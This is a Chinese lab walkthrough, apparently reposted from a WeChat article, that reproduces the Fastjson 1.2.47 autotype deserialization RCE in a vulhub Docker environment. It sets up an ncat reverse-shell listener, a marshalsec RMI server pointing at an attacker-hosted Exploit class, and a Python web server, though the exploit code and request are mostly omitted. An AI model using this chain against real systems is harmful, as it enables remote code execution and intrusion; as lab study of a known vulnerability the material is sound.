# 技术分享 | Fastjson-RCE漏洞复现

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzIxNTQxMjQyNg==&mid=2247487305&idx=1&sn=c64653412fab237b90d8ad2db00fff9f&chksm=9799f4eca0ee7dfa930e1d2a418f7c1a0c87f2b64ff21f115d76057fb71e3d1ae7c8d251548c&scene=126&sessionid=1681371420#rd](http://mp.weixin.qq.com/s?__biz=MzIxNTQxMjQyNg==&mid=2247487305&idx=1&sn=c64653412fab237b90d8ad2db00fff9f&chksm=9799f4eca0ee7dfa930e1d2a418f7c1a0c87f2b64ff21f115d76057fb71e3d1ae7c8d251548c&scene=126&sessionid=1681371420#rd)

![](../Images/d054cf8ab028a63cec36f2e10d002a61.png)

Fastjson提供autotype功能，允许用户在反序列化数据中通过 **@type **指定反序列化的类型，其次Fastjson自定义的反序列化会调用指定类中的setter方法和部分getter方法。

当组件开启autotype并且反序列化不可信的数据时，攻击者构造的数据（恶意代码）会进入特定类的setter或getter方法中，可能会被恶意利用。

**影响版本**

Fastjson1.2.47以及之前的版本

  
  
  
**复现**  
  

  

**1.1**  
**环境准备**

  

**攻击机1**

  

用于接受反弹shell

系统：Win10 x64

安装**nc，burpsuite**

win10中需安装nc，用于监听反弹的shell。

在win10下，在nc官网(https://eternallybored.org/misc/netcat/)下载会报毒被拦截。

可以使用nmap中重置的ncat(https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)，与nc使用无区别。

下载后进入，ncat所在目录，执行ncat，出现如下输出则安装成功

**![](../Images/429deb96664b0aef66efade81a6ae897.png)**

  

**攻击机2**

  

提供一些必要服务

系统：Ubuntu

需安装：marshlsec ( https://github.com/mbechler/marshalsec )（用于启动**RMI**服务）、python环境（用于启动**SimpleHTTPServer**服务）、openjdk

marshlsec下载后，需要使用**mvn**打包，无mvn命令需要安装Maven

marshlsec下载后，进入文件目录执行sudo mvn clean package -DskipTests，完成后会在目录的target目录中发现两个jar包

![](../Images/01a878e1c17089fc274197315858a8dd.png)

  

**受害机**

系统：Ubuntu （与上述提供RMI和Web服务的机器可以是一台或不同）

需安装：docker、docker-composer、vulhub

**1.3**  
**复现流程**

  

在 **攻击机1 **开启监听

  

![](../Images/2bbc192b56e8bc822162c41ea74d0a8f.png)

在**受害机**上启动环境，进入vulhub中的/fastjson/1.2.47-rce/，使用如下命令启动服务：

  

\# docker-compose up -d

在 **攻击机1** 上访问该服务，如下则为成功

  

![](../Images/23762d33bd3df1627a9a14f5aa269378.png)

构造恶意代码文件vim Exploit.java，内容如下

代码中192.168.253.129/6666修改为**攻击机1**的ip和监听反弹shell的端口

```


import java.io.BufferedReader;
```

编写完成后，对该文件进行编译生成对应的**class文件**

  

\# javac Exploit.java

  

![](../Images/68dc4c51191bb3736a38b3cbfa86b90d.png)

  

在 **攻击机2** 上启动RMI和Web服务

**· 启动Web服务**

\# python -m SimpleHTTPServer  8080

  

![](../Images/adeb07c28b5ec40f9bbbd44f422f390c.png)

  

使用 **攻击机1** 访问 **攻击机2**开放的Web服务，如下则成功  

  

![](../Images/b85256c7432687b0b0d214c5a10eb4a6.png)

**· 启动RMI服务**

进入marshalsec打包好的jar包目录执行命令，如下

192.168.253.138:8080 为上述Web服务地址和端口，需自行修改

8888 可为任意端口

\# java -cp marshalsec-0.0.3-SNAPSHOT-all.jar

marshalsec.jndi.RMIRefServer

"http://192.168.253.138:8080/#Exploit" 8888

  

![](../Images/6a22cf7f8ca09a6fe495dfac2b5b852c.png)

![](../Images/b2242e309497e6b3bafffb558b776b6b.png)

  

发送请求后，等待ncat获取反弹shell，可见在恶意代码中构造的命令执行，成功反弹shell，可以执行命令
